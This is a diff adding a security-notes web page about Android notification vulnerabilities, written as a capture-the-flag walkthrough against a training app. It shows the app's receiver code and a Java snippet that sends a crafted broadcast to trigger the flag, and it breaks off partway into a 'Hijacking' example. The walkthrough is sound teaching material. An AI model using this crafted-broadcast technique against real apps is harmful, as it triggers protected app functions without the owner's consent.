@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Notification</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Notification</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#overview" id="toc-overview">Overview</a></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#unprotected-component" id="toc-unprotected-component">Unprotected component</a></li>
+<li><a href="#hijacking" id="toc-hijacking">Hijacking</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<h2 id="overview">Overview</h2>
+<p>Android apps create notifications using <code>NotificationCompat.Builder</code>, supplying an icon, title, text, etc., and optionally adding actions (buttons) with associated <code>PendingIntents</code>. Each action’s PendingIntent typically wraps an <code>Intent</code> targeting a <code>BroadcastReceiver</code> (or service/activity) in your app. For example, an alarm app might add a “Snooze” action button whose PendingIntent is a broadcast to an internal receiver that snoozes the alarm without opening the UI. (It’s used receivers because there’s no need to open the app for that)</p>
+<p>Example 1: Set the notification’s tap action</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> AlertDetails<span class="op">.</span><span class="fu">class</span><span class="op">);</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setFlags</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">FLAG_ACTIVITY_NEW_TASK</span> <span class="op">|</span> Intent<span class="op">.</span><span class="fu">FLAG_ACTIVITY_CLEAR_TASK</span><span class="op">);</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>PendingIntent pendingIntent <span class="op">=</span> PendingIntent<span class="op">.</span><span class="fu">getActivity</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> intent<span class="op">,</span> PendingIntent<span class="op">.</span><span class="fu">FLAG_IMMUTABLE</span><span class="op">);</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>NotificationCompat<span class="op">.</span><span class="fu">Builder</span> builder <span class="op">=</span> <span class="kw">new</span> NotificationCompat<span class="op">.</span><span class="fu">Builder</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> CHANNEL_ID<span class="op">)</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setSmallIcon</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">notification_icon</span><span class="op">)</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentTitle</span><span class="op">(</span><span class="st">&quot;My notification&quot;</span><span class="op">)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentText</span><span class="op">(</span><span class="st">&quot;Hello World!&quot;</span><span class="op">)</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setPriority</span><span class="op">(</span>NotificationCompat<span class="op">.</span><span class="fu">PRIORITY_DEFAULT</span><span class="op">)</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Set the intent that fires when the user taps the notification.</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentIntent</span><span class="op">(</span>pendingIntent<span class="op">)</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setAutoCancel</span><span class="op">(</span><span class="kw">true</span><span class="op">);</span></span></code></pre></div>
+<p>Example 2: Add action buttons</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> ACTION_SNOOZE <span class="op">=</span> <span class="st">&quot;snooze&quot;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>Intent snoozeIntent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> MyBroadcastReceiver<span class="op">.</span><span class="fu">class</span><span class="op">);</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>snoozeIntent<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span>ACTION_SNOOZE<span class="op">);</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>snoozeIntent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span>EXTRA_NOTIFICATION_ID<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>PendingIntent snoozePendingIntent <span class="op">=</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        PendingIntent<span class="op">.</span><span class="fu">getBroadcast</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> snoozeIntent<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>NotificationCompat<span class="op">.</span><span class="fu">Builder</span> builder <span class="op">=</span> <span class="kw">new</span> NotificationCompat<span class="op">.</span><span class="fu">Builder</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> CHANNEL_ID<span class="op">)</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setSmallIcon</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">notification_icon</span><span class="op">)</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentTitle</span><span class="op">(</span><span class="st">&quot;My notification&quot;</span><span class="op">)</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentText</span><span class="op">(</span><span class="st">&quot;Hello World!&quot;</span><span class="op">)</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setPriority</span><span class="op">(</span>NotificationCompat<span class="op">.</span><span class="fu">PRIORITY_DEFAULT</span><span class="op">)</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">setContentIntent</span><span class="op">(</span>pendingIntent<span class="op">)</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">addAction</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">ic_snooze</span><span class="op">,</span> <span class="fu">getString</span><span class="op">(</span>R<span class="op">.</span><span class="fu">string</span><span class="op">.</span><span class="fu">snooze</span><span class="op">),</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>                snoozePendingIntent<span class="op">);</span></span></code></pre></div>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="unprotected-component">Unprotected component</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following Activity:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag20Activity&quot;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag20Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> GET_FLAG <span class="op">=</span> <span class="st">&quot;io.hextree.broadcast.GET_FLAG&quot;</span><span class="op">;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag20Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">void</span> <span class="fu">createNotificationChannel</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">createNotificationChannel</span><span class="op">();</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> action <span class="op">=</span> intent<span class="op">.</span><span class="fu">getAction</span><span class="op">();</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>action <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> action<span class="op">.</span><span class="fu">equals</span><span class="op">(</span>GET_FLAG<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>            <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>        Flag20Receiver flag20Receiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">Flag20Receiver</span><span class="op">();</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>        IntentFilter intentFilter <span class="op">=</span> <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span>GET_FLAG<span class="op">);</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>Build<span class="op">.</span><span class="fu">VERSION</span><span class="op">.</span><span class="fu">SDK_INT</span> <span class="op">&gt;=</span> <span class="dv">33</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>            <span class="fu">registerReceiver</span><span class="op">(</span>flag20Receiver<span class="op">,</span> intentFilter<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>            <span class="fu">registerReceiver</span><span class="op">(</span>flag20Receiver<span class="op">,</span> intentFilter<span class="op">);</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>        NotificationCompat<span class="op">.</span><span class="fu">Builder</span> builderAddAction <span class="op">=</span> <span class="kw">new</span> NotificationCompat<span class="op">.</span><span class="fu">Builder</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;CHANNEL_ID&quot;</span><span class="op">).</span><span class="fu">setSmallIcon</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">hextree_logo</span><span class="op">).</span><span class="fu">setContentTitle</span><span class="op">(</span><span class="kw">this</span><span class="op">.</span><span class="fu">name</span><span class="op">).</span><span class="fu">setContentText</span><span class="op">(</span><span class="st">&quot;Reverse engineer classes Flag20Activity and Flag20Receiver&quot;</span><span class="op">).</span><span class="fu">setPriority</span><span class="op">(</span><span class="dv">0</span><span class="op">).</span><span class="fu">setAutoCancel</span><span class="op">(</span><span class="kw">true</span><span class="op">).</span><span class="fu">addAction</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">hextree_logo</span><span class="op">,</span> <span class="st">&quot;Get Flag&quot;</span><span class="op">,</span> PendingIntent<span class="op">.</span><span class="fu">getBroadcast</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span>GET_FLAG<span class="op">),</span> <span class="dv">201326592</span><span class="op">));</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>ActivityCompat<span class="op">.</span><span class="fu">checkSelfPermission</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;android.permission.POST_NOTIFICATIONS&quot;</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>Build<span class="op">.</span><span class="fu">VERSION</span><span class="op">.</span><span class="fu">SDK_INT</span> <span class="op">&gt;=</span> <span class="dv">33</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>                ActivityCompat<span class="op">.</span><span class="fu">requestPermissions</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;android.permission.POST_NOTIFICATIONS&quot;</span><span class="op">},</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>            NotificationManagerCompat<span class="op">.</span><span class="fu">from</span><span class="op">(</span><span class="kw">this</span><span class="op">).</span><span class="fu">notify</span><span class="op">(</span><span class="dv">1</span><span class="op">,</span> builderAddAction<span class="op">.</span><span class="fu">build</span><span class="op">());</span></span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>            Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Check your notifications&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag20Receiver <span class="kw">extends</span> BroadcastReceiver <span class="op">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag20Receiver.onReceive&quot;</span><span class="op">,</span> Utils<span class="op">.</span><span class="fu">dumpIntent</span><span class="op">(</span>context<span class="op">,</span> intent<span class="op">));</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getBooleanExtra</span><span class="op">(</span><span class="st">&quot;give-flag&quot;</span><span class="op">,</span> <span class="kw">false</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>            <span class="fu">success</span><span class="op">(</span>context<span class="op">);</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>            Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span>context<span class="op">,</span> <span class="st">&quot;Conditions not correct for flag&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">void</span> <span class="fu">success</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To get the flag:</p>
+<ol type="1">
+<li>Launch the <code>Flag20Activity</code>. This step is required to dynamically register <code>Flag20Receiver</code> and display the notification. Since the Activity is not exported, this must be done from within the app.</li>
+<li>Wait for the notification. The notification contains an action that sends a broadcast with the correct action (<code>GET_FLAG</code>).</li>
+<li>Send a crafted broadcast.</li>
+</ol>
+<div class="sourceCode" id="cb6"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;io.hextree.broadcast.GET_FLAG&quot;</span><span class="op">);</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;give-flag&quot;</span><span class="op">,</span> <span class="kw">true</span><span class="op">);</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sendBroadcast</span><span class="op">(</span>intent<span class="op">);</span></span></code></pre></div>
+<h3 id="hijacking">Hijacking</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following Activity:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag21Activity&quot;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag21Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> GIVE_FLAG <span class="op">=</span> <span class="st">&quot;io.hextree.broadcast.GIVE_FLAG&quot;</span><span class="op">;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag21Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">void</span> <span class="fu">createNotificationChannel</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">createNotificationChannel</span><span class="op">();</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span><span class="fu">getIntent</span><span class="op">()</span> <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>        BroadcastReceiver broadcastReceiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>            <span class="at">@Override</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>            <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>                <span class="bu">String</span> resultData <span class="op">=</span> <span class="fu">getResultData</span><span class="op">();</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>                Bundle resultExtras <span class="op">=</span> <span class="fu">getResultExtras</span><span class="op">(</span><span class="kw">false</span><span class="op">);</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>                <span class="dt">int</span> resultCode <span class="op">=</span> <span class="fu">getResultCode</span><span class="op">();</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultData &quot;</span> <span class="op">+</span> resultData<span class="op">);</span></span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultExtras &quot;</span> <span class="op">+</span> resultExtras<span class="op">);</span></span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultCode &quot;</span> <span class="op">+</span> resultCode<span class="op">);</span></span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>                Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span>context<span class="op">,</span> <span class="st">&quot;Check the broadcast intent for the flag&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>                Flag21Activity flag21Activity <span class="op">=</span> Flag21Activity<span class="op">.</span><span class="fu">this</span><span class="op">;</span></span>
